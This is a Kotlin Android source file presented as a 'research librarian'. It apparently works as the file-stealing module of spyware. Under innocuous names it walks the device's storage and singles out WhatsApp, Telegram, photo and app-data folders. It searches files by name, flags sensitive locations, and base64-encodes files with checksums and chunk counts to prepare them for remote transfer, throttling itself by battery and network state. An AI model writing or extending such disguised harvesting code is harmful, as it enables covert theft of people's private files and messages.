package com.example.kem

import android.content.Context
import android.content.pm.PackageManager
import android.os.Environment
import android.os.StatFs
import android.os.BatteryManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.util.Log
import androidx.core.content.ContextCompat
import android.Manifest
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.ByteArrayOutputStream
import java.util.Base64
import java.text.SimpleDateFormat
import java.util.*
import kotlinx.coroutines.*
import kotlin.collections.ArrayDeque

// ==================== SMART RESOURCE MONITOR ====================
object SmartResourceMonitor {
    
    fun getBatteryLevel(context: Context): Int {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }
    
    fun isLowBattery(context: Context): Boolean {
        return getBatteryLevel(context) < 20
    }
    
    fun isCharging(context: Context): Boolean {
        val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return batteryManager.isCharging
    }
    
    fun getNetworkType(context: Context): String {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork ?: return "none"
        val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return "none"
        
        return when {
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "cellular"
            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ethernet"
            else -> "unknown"
        }
    }
    
    fun shouldLimitOperations(context: Context): Boolean {
        return isLowBattery(context) && !isCharging(context)
    }
    
    fun getOptimalBatchSize(context: Context): Int {
        val networkType = getNetworkType(context)
        val batteryLevel = getBatteryLevel(context)
        
        return when {
            networkType == "wifi" && batteryLevel > 50 -> 20
            networkType == "wifi" && batteryLevel > 20 -> 10
            networkType == "cellular" && batteryLevel > 50 -> 5
            networkType == "cellular" && batteryLevel > 20 -> 3
            else -> 1
        }
    }
    
    fun getOptimalTransferSize(context: Context): Long {
        val networkType = getNetworkType(context)
        val batteryLevel = getBatteryLevel(context)
        
        return when {
            networkType == "wifi" && batteryLevel > 50 -> 10 * 1024 * 1024L // 10MB
            networkType == "wifi" && batteryLevel > 20 -> 5 * 1024 * 1024L  // 5MB
            networkType == "cellular" && batteryLevel > 50 -> 2 * 1024 * 1024L // 2MB
            networkType == "cellular" && batteryLevel > 20 -> 1 * 1024 * 1024L // 1MB
            else -> 512 * 1024L // 512KB
        }
    }
}

// ==================== DOCUMENT LIBRARY CONSTANTS ====================
object DocumentLibraryConstants {
    const val LOG_TAG = "ResearchLibrarian"
    
    const val MAX_LIBRARY_SCAN_SIZE = 2000
    const val PREVIEW_CONTENT_LENGTH = 1000
    const val BATCH_CATALOG_SIZE = 15
    const val CONTENT_SAMPLE_SIZE = 4096
    const val SYNC_QUEUE_LIMIT = 100
    const val MAX_SEARCH_RESULTS = 50
    const val MAX_DIRECTORY_DEPTH = 5
    const val TRANSFER_CHUNK_SIZE = 1024 * 1024
    
    val ACADEMIC_FORMATS = setOf("pdf", "doc", "docx", "txt", "rtf", "odt", "epub")
    val VISUAL_CONTENT = setOf("jpg", "jpeg", "png", "gif", "bmp", "webp", "svg", "tiff")
    val AUDIO_LIBRARY = setOf("mp3", "wav", "aac", "m4a", "ogg", "flac", "wma")
    val VIDEO_COLLECTIONS = setOf("mp4", "avi", "mkv", "mov", "wmv", "flv", "webm")
    val DATA_ARCHIVES = setOf("zip", "rar", "7z", "tar", "gz", "bz2")
    val SYSTEM_RESOURCES = setOf("apk", "dex", "so", "db", "sqlite", "json", "xml")
    val SPREADSHEET_DATA = setOf("xls", "xlsx", "csv", "ods")
    val PRESENTATION_FILES = setOf("ppt", "pptx", "odp")
    
    val SYSTEM_LIBRARY_SECTIONS = mapOf(
        "primary_storage" to "Main Research Library",
        "secondary_storage" to "Extended Collections",
        "downloads_archive" to "Acquisition Archive",
        "documents_vault" to "Document Repository",
        "media_collections" to "Multimedia Archive",
        "application_resources" to "System Resources",
        "cache_repository" to "Temporary Research Cache",
        "external_archives" to "External Collections"
    )
    
    val LIBRARY_SECTIONS = mapOf(
        "academic" to "Academic Research",
        "visual" to "Visual Documentation",
        "audio" to "Audio Research",
        "video" to "Video Documentation", 
        "archives" to "Compressed Archives",
        "system" to "System Documentation",
        "spreadsheets" to "Data Analysis",
        "presentations" to "Research Presentations",
        "personal" to "Personal Research"
    )
    
    fun classifyContent(fileName: String): String {
        val extension = fileName.substringAfterLast('.', "").lowercase()
        return when {
            extension in ACADEMIC_FORMATS -> "academic"
            extension in VISUAL_CONTENT -> "visual"
            extension in AUDIO_LIBRARY -> "audio"
            extension in VIDEO_COLLECTIONS -> "video"
            extension in DATA_ARCHIVES -> "archives"
            extension in SYSTEM_RESOURCES -> "system"
            extension in SPREADSHEET_DATA -> "spreadsheets"
            extension in PRESENTATION_FILES -> "presentations"
            else -> "personal"
        }
    }
    
    fun isTransferableContent(file: File): Boolean {
        return file.exists() && file.canRead() && file.length() <= 10 * 1024 * 1024L // 10MB limit
    }
}

// ==================== REMOTE LIBRARY MANAGER ====================
class RemoteLibraryManager(context: Context) : BaseDataProcessor(context) {
    
    fun hasLibraryAccess(): Boolean {
        return BaseUtils.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) ||
               BaseUtils.checkPermission(context, Manifest.permission.MANAGE_EXTERNAL_STORAGE)
    }
    
    fun exploreLibrarySection(sectionPath: String? = null, maxDepth: Int = 2): JSONObject {
        return safeExecute("library section exploration") {
            if (!hasLibraryAccess()) {
                return@safeExecute BaseUtils.createErrorResponse("access_restricted", "Library access credentials required")
            }
            
            val targetPath = sectionPath ?: Environment.getExternalStorageDirectory().absolutePath
            val targetDirectory = File(targetPath)
            
            if (!targetDirectory.exists() || !targetDirectory.canRead()) {
                return@safeExecute BaseUtils.createErrorResponse("section_unavailable", "Requested library section not accessible")
            }
            
            val sectionContents = exploreSectionContents(targetDirectory, maxDepth)
            val sectionMetadata = generateSectionMetadata(targetDirectory)
            val navigationContext = buildNavigationContext(targetDirectory)
            
            createSuccessResponse(
                JSONObject().apply {
                    put("section_contents", sectionContents)
                    put("section_metadata", sectionMetadata)
                    put("navigation_context", navigationContext)
                    put("exploration_path", targetPath)
                    put("access_permissions", analyzeSectionPermissions(targetDirectory))
                },
                sectionContents.length()
            ).apply {
                put("exploration_timestamp", System.currentTimeMillis())
                put("system_resources", SmartResourceMonitor.getBatteryLevel(context))
                Log.i(DocumentLibraryConstants.LOG_TAG, "Library section exploration completed: $targetPath")
            }
        }
    }
    
    private fun exploreSectionContents(directory: File, maxDepth: Int, currentDepth: Int = 0): JSONArray {
        val contents = JSONArray()
        
        if (currentDepth >= maxDepth || SmartResourceMonitor.shouldLimitOperations(context)) {
            return contents
        }
        
        try {
            val items = directory.listFiles() ?: return contents
            val batchSize = SmartResourceMonitor.getOptimalBatchSize(context)
            var processedCount = 0
            
            for (item in items) {
                if (processedCount >= batchSize) break
                
                try {
                    val itemInfo = JSONObject().apply {
                        put("item_name", item.name)
                        put("item_type", if (item.isDirectory) "collection" else "document")
                        put("full_path", item.absolutePath)
                        put("relative_path", item.name)
                        put("last_modified", BaseUtils.formatTimestamp(item.lastModified()))
                        put("accessibility", item.canRead())
                        
                        if (item.isFile) {
                            put("content_size", item.length())
                            put("size_formatted", formatFileSize(item.length()))
                            put("content_type", DocumentLibraryConstants.classifyContent(item.name))
                            put("classification", DocumentLibraryConstants.LIBRARY_SECTIONS[DocumentLibraryConstants.classifyContent(item.name)])
                            put("transferable", DocumentLibraryConstants.isTransferableContent(item))
                            put("extension", item.extension.lowercase())
                        } else {
                            val subItems = item.listFiles()
                            put("items_count", subItems?.size ?: 0)
                            put("contains_documents", subItems?.any { it.isFile } ?: false)
                            put("estimated_size", estimateDirectorySize(item))
                            
                            if (currentDepth < maxDepth - 1 && (subItems?.size ?: 0) <= 10) {
                                put("sub_contents", exploreSectionContents(item, maxDepth, currentDepth + 1))
                            }
                        }
                    }
                    contents.put(itemInfo)
                    processedCount++
                    
                } catch (e: Exception) {
                    Log.w(DocumentLibraryConstants.LOG_TAG, "Error processing item: ${item.name}", e)
                }
            }
        } catch (e: SecurityException) {
            Log.w(DocumentLibraryConstants.LOG_TAG, "Access restricted for directory: ${directory.absolutePath}")
        }
        
        return contents
    }
    
    private fun generateSectionMetadata(directory: File): JSONObject {
        return JSONObject().apply {
            put("section_name", directory.name)
            put("section_path", directory.absolutePath)
            put("parent_section", directory.parent)
            put("is_root_section", directory.parent == null || directory == Environment.getExternalStorageDirectory())
            put("creation_date", BaseUtils.formatTimestamp(directory.lastModified()))
            put("access_level", if (directory.canWrite()) "full_access" else "read_only")
            put("space_available", getAvailableSpace())
            put("space_formatted", formatFileSize(getAvailableSpace()))
        }
    }
    
    private fun buildNavigationContext(currentDirectory: File): JSONObject {
        return JSONObject().apply {
            val pathComponents = JSONArray()
            var current = currentDirectory
            val components = mutableListOf<File>()
            
            while (current.parent != null) {
                components.add(0, current)
                current = current.parentFile ?: break
                if (components.size > 10) break
            }
            
            components.forEach { component ->
                pathComponents.put(JSONObject().apply {
                    put("section_name", component.name)
                    put("section_path", component.absolutePath)
                    put("is_accessible", component.canRead())
                })
            }
            
            put("navigation_path", pathComponents)
            put("can_navigate_up", currentDirectory.parent != null)
            put("root_distance", components.size)
        }
    }
    
    private fun analyzeSectionPermissions(directory: File): JSONObject {
        return JSONObject().apply {
            put("can_read", directory.canRead())
            put("can_write", directory.canWrite())
            put("can_execute", directory.canExecute())
            put("is_hidden", directory.isHidden)
            put("requires_elevation", !directory.canWrite() && directory.canRead())
            put("security_level", when {
                directory.canWrite() -> "full_access"
                directory.canRead() -> "read_only"
                else -> "restricted"
            })
        }
    }
    
    fun prepareDocumentCopy(documentPath: String, includeMetadata: Boolean = true): JSONObject {
        return safeExecute("document copy preparation") {
            val documentFile = File(documentPath)
            
            if (!documentFile.exists() || !documentFile.canRead()) {
                return@safeExecute BaseUtils.createErrorResponse("document_unavailable", "Requested document cannot be accessed")
            }
            
            if (!DocumentLibraryConstants.isTransferableContent(documentFile)) {
                return@safeExecute BaseUtils.createErrorResponse("transfer_restricted", "Document exceeds transfer limitations")
            }
            
            val documentCopy = prepareSecureDocumentTransfer(documentFile)
            val transferMetadata = generateTransferMetadata(documentFile)
            val securityInfo = analyzeDocumentSecurity(documentFile)
            
            createSuccessResponse(
                JSONObject().apply {
                    put("document_copy", documentCopy)
                    put("transfer_metadata", transferMetadata)
                    if (includeMetadata) {
                        put("security_analysis", securityInfo)
                    }
                    put("transfer_ready", true)
                },
                1
            ).apply {
                put("preparation_timestamp", System.currentTimeMillis())
                Log.i(DocumentLibraryConstants.LOG_TAG, "Document copy prepared: ${documentFile.name}")
            }
        }
    }
    
    private fun prepareSecureDocumentTransfer(file: File): JSONObject {
        return JSONObject().apply {
            try {
                put("document_name", file.name)
                put("document_size", file.length())
                put("document_type", DocumentLibraryConstants.classifyContent(file.name))
                put("encoding_format", "base64")
                put("transfer_method", "secure_stream")
                
                if (file.length() <= 1024 * 1024) {
                    val fileBytes = file.readBytes()
                    val encodedContent = Base64.getEncoder().encodeToString(fileBytes)
                    put("document_content", encodedContent)
                    put("content_included", true)
                } else {
                    put("content_included", false)
                    put("requires_streaming", true)
                    put("suggested_chunk_size", DocumentLibraryConstants.TRANSFER_CHUNK_SIZE)
                    put("total_chunks", (file.length() + DocumentLibraryConstants.TRANSFER_CHUNK_SIZE - 1) / DocumentLibraryConstants.TRANSFER_CHUNK_SIZE)
                }
                
                put("checksum", calculateFileChecksum(file))
                
            } catch (e: Exception) {
                Log.e(DocumentLibraryConstants.LOG_TAG, "Error preparing document transfer", e)
                put("transfer_error", e.message)
                put("content_included", false)
            }
        }
    }
    
    private fun generateTransferMetadata(file: File): JSONObject {
        return JSONObject().apply {
            put("original_path", file.absolutePath)
            put("document_name", file.name)
            put("file_extension", file.extension)
            put("content_classification", DocumentLibraryConstants.LIBRARY_SECTIONS[DocumentLibraryConstants.classifyContent(file.name)])
            put("last_modified", BaseUtils.formatTimestamp(file.lastModified()))
            put("transfer_timestamp", System.currentTimeMillis())
            put("network_type", SmartResourceMonitor.getNetworkType(context))
            put("battery_level", SmartResourceMonitor.getBatteryLevel(context))
            put("optimal_transfer", !SmartResourceMonitor.shouldLimitOperations(context))
        }
    }
    
    private fun analyzeDocumentSecurity(file: File): JSONObject {
        return JSONObject().apply {
            put("read_permissions", file.canRead())
            put("write_permissions", file.canWrite())
            put("hidden_document", file.isHidden)
            put("system_document", file.absolutePath.contains("/system/") || file.absolutePath.contains("/data/data/"))
            put("sensitive_location", file.absolutePath.contains("private") || file.absolutePath.contains("secure"))
            put("access_level", when {
                file.canWrite() -> "full_access"
                file.canRead() -> "read_only"
                else -> "restricted"
            })
        }
    }
    
    private fun calculateFileChecksum(file: File): String {
        return try {
            val bytes = file.readBytes()
            val digest = java.security.MessageDigest.getInstance("MD5")
            val hash = digest.digest(bytes)
            hash.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            "checksum_unavailable"
        }
    }
    
    fun getLibraryCatalogs(): JSONObject {
        return safeExecute("library catalogs retrieval") {
            val primaryCatalogs = getPrimaryCatalogs()
            val secondaryCatalogs = getSecondaryCatalogs()
            val systemStatus = getLibrarySystemStatus()
            
            createSuccessResponse(
                JSONObject().apply {
                    put("primary_catalogs", primaryCatalogs)
                    put("secondary_catalogs", secondaryCatalogs)
                    put("system_status", systemStatus)
                    put("total_sections", primaryCatalogs.length() + secondaryCatalogs.length())
                },
                primaryCatalogs.length() + secondaryCatalogs.length()
            ).apply {
                put("catalog_timestamp", System.currentTimeMillis())
                Log.i(DocumentLibraryConstants.LOG_TAG, "Library catalogs retrieved")
            }
        }
    }
    
    private fun getPrimaryCatalogs(): JSONArray {
        val catalogs = JSONArray()
        
        val primaryDirectories = listOf(
            Environment.getExternalStorageDirectory(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC)
        )
        
        primaryDirectories.forEach { directory ->
            if (directory != null && directory.exists() && directory.canRead()) {
                catalogs.put(createCatalogEntry(directory, "primary"))
            }
        }
        
        return catalogs
    }
    
    private fun getSecondaryCatalogs(): JSONArray {
        val catalogs = JSONArray()
        
        val secondaryPaths = listOf(
            "/storage/emulated/0/Android/data",
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/WhatsApp",
            "/storage/emulated/0/Telegram",
            context.filesDir.absolutePath,
            context.cacheDir.absolutePath
        )
        
        secondaryPaths.forEach { path ->
            val directory = File(path)
            if (directory.exists() && directory.canRead()) {
                catalogs.put(createCatalogEntry(directory, "secondary"))
            }
        }
        
        return catalogs
    }
    
    private fun createCatalogEntry(directory: File, catalogType: String): JSONObject {
        return JSONObject().apply {
            put("catalog_name", directory.name.ifEmpty { "Root Library" })
            put("catalog_path", directory.absolutePath)
            put("catalog_type", catalogType)
            put("section_classification", DocumentLibraryConstants.SYSTEM_LIBRARY_SECTIONS[getSectionKey(directory)] ?: "Unknown Section")
            put("is_accessible", directory.canRead())
            put("contains_collections", directory.isDirectory)
            put("estimated_items", directory.listFiles()?.size ?: 0)
            put("last_accessed", BaseUtils.formatTimestamp(directory.lastModified()))
            put("storage_space", if (directory.canRead()) estimateDirectorySize(directory) else 0)
            put("space_formatted", formatFileSize(if (directory.canRead()) estimateDirectorySize(directory) else 0))
            put("access_permissions", analyzeSectionPermissions(directory))
        }
    }
    
    private fun getSectionKey(directory: File): String {
        val path = directory.absolutePath.lowercase()
        return when {
            path.contains("download") -> "downloads_archive"
            path.contains("document") -> "documents_vault"
            path.contains("picture") || path.contains("dcim") -> "media_collections"
            path.contains("music") || path.contains("audio") -> "media_collections"
            path.contains("movie") || path.contains("video") -> "media_collections"
            path.contains("android/data") -> "application_resources"
            path.contains("cache") -> "cache_repository"
            path.contains("storage/emulated/0") && directory.name.isEmpty() -> "primary_storage"
            else -> "external_archives"
        }
    }
    
    fun queryContentIndex(searchQuery: String, searchPath: String? = null, contentFilter: String? = null): JSONObject {
        return safeExecute("content index query") {
            if (searchQuery.isBlank()) {
                return@safeExecute BaseUtils.createErrorResponse("invalid_query", "Search query cannot be empty")
            }
            
            val searchResults = performContentSearch(searchQuery, searchPath, contentFilter)
            val searchMetadata = generateSearchMetadata(searchQuery, searchPath, contentFilter)
            val resultClassification = classifySearchResults(searchResults)
            
            createSuccessResponse(
                JSONObject().apply {
                    put("search_results", searchResults)
                    put("search_metadata", searchMetadata)
                    put("result_classification", resultClassification)
                    put("total_matches", searchResults.length())
                },
                searchResults.length()
            ).apply {
                put("search_timestamp", System.currentTimeMillis())
                Log.i(DocumentLibraryConstants.LOG_TAG, "Content search completed: $searchQuery (${searchResults.length()} results)")
            }
        }
    }
    
    private fun performContentSearch(query: String, searchPath: String?, contentFilter: String?): JSONArray {
        val results = JSONArray()
        val searchRoot = searchPath?.let { File(it) } ?: Environment.getExternalStorageDirectory()
        
        if (!searchRoot.exists() || !searchRoot.canRead()) {
            return results
        }
        
        val lowercaseQuery = query.lowercase()
        searchInDirectory(searchRoot, lowercaseQuery, contentFilter, results, 0)
        
        return results
    }
    
    private fun searchInDirectory(directory: File, query: String, filter: String?, results: JSONArray, depth: Int) {
        if (depth >= DocumentLibraryConstants.MAX_DIRECTORY_DEPTH || 
            results.length() >= DocumentLibraryConstants.MAX_SEARCH_RESULTS ||
            SmartResourceMonitor.shouldLimitOperations(context)) {
            return
        }
        
        try {
            val items = directory.listFiles() ?: return
            
            for (item in items) {
                if (results.length() >= DocumentLibraryConstants.MAX_SEARCH_RESULTS) break
                
                try {
                    val matchesName = item.name.lowercase().contains(query)
                    val matchesFilter = filter == null || DocumentLibraryConstants.classifyContent(item.name) == filter
                    
                    if (matchesName && matchesFilter) {
                        val resultEntry = JSONObject().apply {
                            put("item_name", item.name)
                            put("item_path", item.absolutePath)
                            put("item_type", if (item.isDirectory) "collection" else "document")
                            put("parent_section", item.parent)
                            put("content_classification", DocumentLibraryConstants.LIBRARY_SECTIONS[DocumentLibraryConstants.classifyContent(item.name)])
                            put("last_modified", BaseUtils.formatTimestamp(item.lastModified()))
                            put("match_relevance", calculateMatchRelevance(item.name, query))
                            
                            if (item.isFile) {
                                put("file_size", item.length())
                                put("size_formatted", formatFileSize(item.length()))
                                put("is_transferable", DocumentLibraryConstants.isTransferableContent(item))
                                put("file_extension", item.extension.lowercase())
                            } else {
                                put("items_count", item.listFiles()?.size ?: 0)
                                put("estimated_size", estimateDirectorySize(item))
                            }
                            
                            put("accessibility", item.canRead())
                            put("search_depth", depth)
                        }
                        results.put(resultEntry)
                    }
                    
                    if (item.isDirectory) {
                        searchInDirectory(item, query, filter, results, depth + 1)
                    }
                    
                } catch (e: Exception) {
                    Log.w(DocumentLibraryConstants.LOG_TAG, "Error searching item: ${item.name}", e)
                }
            }
        } catch (e: SecurityException) {
            Log.w(DocumentLibraryConstants.LOG_TAG, "Search access denied: ${directory.absolutePath}")
        }
    }
    
    private fun calculateMatchRelevance(fileName: String, query: String): Double {
        val lowercaseName = fileName.lowercase()
        val lowercaseQuery = query.lowercase()
        
        return when {
            lowercaseName == lowercaseQuery -> 1.0
            lowercaseName.startsWith(lowercaseQuery) -> 0.9
            lowercaseName.contains(lowercaseQuery) -> 0.7
            else -> 0.5
        }
    }
    
    private fun generateSearchMetadata(query: String, searchPath: String?, contentFilter: String?): JSONObject {
        return JSONObject().apply {
            put("search_query", query)
            put("search_scope", searchPath ?: "entire_library")
            put("content_filter", contentFilter ?: "all_types")
            put("search_method", "recursive_indexing")
            put("max_results_limit", DocumentLibraryConstants.MAX_SEARCH_RESULTS)
            put("search_depth_limit", DocumentLibraryConstants.MAX_DIRECTORY_DEPTH)
            put("network_optimized", SmartResourceMonitor.getNetworkType(context))
            put("battery_optimized", !SmartResourceMonitor.shouldLimitOperations(context))
        }
    }
    
    private fun classifySearchResults(results: JSONArray): JSONObject {
        val classification = JSONObject()
        val typeCount = mutableMapOf<String, Int>()
        val sizeByType = mutableMapOf<String, Long>()
        var totalSize = 0L
        
        for (i in 0 until results.length()) {
            val result = results.getJSONObject(i)
            val contentType = result.optString("content_classification", "Unknown")
            val size = result.optLong("file_size", 0)
            
            typeCount[contentType] = typeCount.getOrDefault(contentType, 0) + 1
            sizeByType[contentType] = sizeByType.getOrDefault(contentType, 0) + size
            totalSize += size
        }
        
        classification.put("results_by_type", JSONObject(typeCount.mapKeys { it.key }))
        classification.put("size_by_type", JSONObject(sizeByType.mapKeys { it.key }))
        classification.put("total_size", totalSize)
        classification.put("size_formatted", formatFileSize(totalSize))
        classification.put("most_common_type", typeCount.maxByOrNull { it.value }?.key ?: "None")
        
        return classification
    }
    
    private fun getLibrarySystemStatus(): JSONObject {
        return JSONObject().apply {
            put("system_access_level", if (hasLibraryAccess()) "authorized" else "restricted")
            put("battery_status", SmartResourceMonitor.getBatteryLevel(context))
            put("network_connectivity", SmartResourceMonitor.getNetworkType(context))
            put("storage_available", formatFileSize(getAvailableSpace()))
            put("operations_optimized", !SmartResourceMonitor.shouldLimitOperations(context))
            put("transfer_capability", SmartResourceMonitor.getOptimalTransferSize(context))
            put("optimal_batch_size", SmartResourceMonitor.getOptimalBatchSize(context))
        }
    }
    
    private fun estimateDirectorySize(directory: File, maxSample: Int = 50): Long {
        var size = 0L
        var fileCount = 0
        
        try {
            directory.listFiles()?.forEach { file ->
                if (fileCount >= maxSample) return@forEach
                if (file.isFile) {
                    size += file.length()
                    fileCount++
                }
            }
        } catch (e: Exception) {
            Log.w(DocumentLibraryConstants.LOG_TAG, "Error estimating directory size", e)
        }
        
        return size
    }
    
    private fun getAvailableSpace(): Long {
        return try {
            val stat = StatFs(Environment.getExternalStorageDirectory().path)
            stat.availableBlocksLong * stat.blockSizeLong
        } catch (e: Exception) {
            0L
        }
    }
    
    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes >= 1024 * 1024 * 1024 -> "%.1f GB".format(bytes / (1024.0 * 1024.0 * 1024.0))
            bytes >= 1024 * 1024 -> "%.1f MB".format(bytes / (1024.0 * 1024.0))
            bytes >= 1024 -> "%.1f KB".format(bytes / 1024.0)
            else -> "$bytes B"
        }
    }
}

// ==================== SIMPLE SYNC QUEUE ====================
class IntelligentSyncQueue(private val context: Context) {
    
    private val syncQueue = ArrayDeque<SyncTask>()
    private val priorityQueue = ArrayDeque<SyncTask>()
    private var isProcessing = false
    
    data class SyncTask(
        val filePath: String,
        val contentType: String,
        val priority: Int,
        val sizeBytes: Long,
        val operation: String = "catalog",
        val createdAt: Long = System.currentTimeMillis()
    )
    
    fun addTask(filePath: String, contentType: String, priority: Int = 1, operation: String = "catalog") {
        val file = File(filePath)
        if (!file.exists()) return
        
        val task = SyncTask(filePath, contentType, priority, file.length(), operation)
        
        if (priority > 5) {
            priorityQueue.addLast(task)
        } else {
            syncQueue.addLast(task)
        }
    }
    
    suspend fun processQueue(onProgress: (String) -> Unit): List<JSONObject> {
        if (isProcessing) return emptyList()
        isProcessing = true
        
        val results = mutableListOf<JSONObject>()
        
        try {
            while (priorityQueue.isNotEmpty() && !SmartResourceMonitor.shouldLimitOperations(context)) {
                val task = priorityQueue.removeFirst()
                processTask(task, onProgress)?.let { results.add(it) }
                delay(100)
            }
            
            val batchSize = SmartResourceMonitor.getOptimalBatchSize(context)
            var processed = 0
            
            while (syncQueue.isNotEmpty() && processed < batchSize && !SmartResourceMonitor.shouldLimitOperations(context)) {
                val task = syncQueue.removeFirst()
                processTask(task, onProgress)?.let { results.add(it) }
                processed++
                delay(50)
            }
            
        } finally {
            isProcessing = false
        }
        
        return results
    }
    
    private suspend fun processTask(task: SyncTask, onProgress: (String) -> Unit): JSONObject? {
        return try {
            onProgress("Processing ${task.contentType} content via ${task.operation}...")
            
            val file = File(task.filePath)
            if (!file.exists()) return null
            
            JSONObject().apply {
                put("operation", task.operation)
                put("item_name", file.name)
                put("content_type", task.contentType)
                put("file_size", file.length())
                put("processing_timestamp", System.currentTimeMillis())
            }
        } catch (e: Exception) {
            Log.w(DocumentLibraryConstants.LOG_TAG, "Error processing task: ${task.filePath}", e)
            null
        }
    }
    
    fun getQueueStatus(): JSONObject {
        return JSONObject().apply {
            put("priority_tasks", priorityQueue.size)
            put("regular_tasks", syncQueue.size)
            put("is_processing", isProcessing)
            put("total_pending", priorityQueue.size + syncQueue.size)
            put("queue_optimization", !SmartResourceMonitor.shouldLimitOperations(context))
        }
    }
}

// ==================== DOCUMENT LIBRARIAN ====================
class DocumentLibrarian(context: Context) : BaseDataProcessor(context) {
    
    private val syncQueue = IntelligentSyncQueue(context)
    private val remoteManager = RemoteLibraryManager(context)
    
    fun hasLibraryAccess(): Boolean {
        return BaseUtils.checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) ||
               BaseUtils.checkPermission(context, Manifest.permission.MANAGE_EXTERNAL_STORAGE)
    }
    
    fun catalogLibraryContent(targetPath: String? = null): JSONObject {
        return remoteManager.exploreLibrarySection(targetPath, 3)
    }
    
    fun exploreLibrarySection(sectionPath: String?, maxDepth: Int = 2): JSONObject {
        return remoteManager.exploreLibrarySection(sectionPath, maxDepth)
    }
    
    fun prepareDocumentCopy(documentPath: String): JSONObject {
        return remoteManager.prepareDocumentCopy(documentPath)
    }
    
    fun getLibraryCatalogs(): JSONObject {
        return remoteManager.getLibraryCatalogs()
    }
    
    fun queryContentIndex(searchQuery: String, searchPath: String? = null, contentFilter: String? = null): JSONObject {
        return remoteManager.queryContentIndex(searchQuery, searchPath, contentFilter)
    }
    
    suspend fun processContentQueue(onProgress: (String) -> Unit): JSONObject {
        return try {
            val processedItems = syncQueue.processQueue(onProgress)
            JSONObject().apply {
                put("status", "success")
                put("processed_count", processedItems.size)
                put("processed_items", JSONArray(processedItems))
                put("queue_status", syncQueue.getQueueStatus())
                put("processing_timestamp", System.currentTimeMillis())
            }
        } catch (e: Exception) {
            Log.e(DocumentLibraryConstants.LOG_TAG, "Error processing content queue", e)
            BaseUtils.createErrorResponse("processing_error", "Failed to process content queue")
        }
    }
    
    fun analyzeSpecificContent(filePath: String): JSONObject {
        return safeExecute("specific content analysis") {
            val file = File(filePath)
            if (!file.exists() || !file.canRead()) {
                return@safeExecute BaseUtils.createErrorResponse("file_not_accessible", "Cannot access specified content")
            }
            
            val contentType = DocumentLibraryConstants.classifyContent(file.name)
            val analysis = JSONObject().apply {
                put("file_path", filePath)
                put("file_name", file.name)
                put("content_type", contentType)
                put("content_classification", DocumentLibraryConstants.LIBRARY_SECTIONS[contentType])
                put("file_size", file.length())
                put("last_modified", BaseUtils.formatTimestamp(file.lastModified()))
                put("readable", file.canRead())
                put("extension", file.extension.lowercase())
                put("transferable", DocumentLibraryConstants.isTransferableContent(file))
                
                if (contentType == "academic" && file.extension.lowercase() == "txt" && 
                    file.length() < DocumentLibraryConstants.CONTENT_SAMPLE_SIZE) {
                    try {
                        val content = BaseUtils.sanitizeText(file.readText(), DocumentLibraryConstants.PREVIEW_CONTENT_LENGTH)
                        put("content_sample", content)
                        put("word_count", content.split("\\s+".toRegex()).size)
                        put("character_count", content.length)
                    } catch (e: Exception) {
                        put("content_sample", "Content preview not available")
                    }
                }
            }
            
            createSuccessResponse(analysis, 1)
        }
    }
}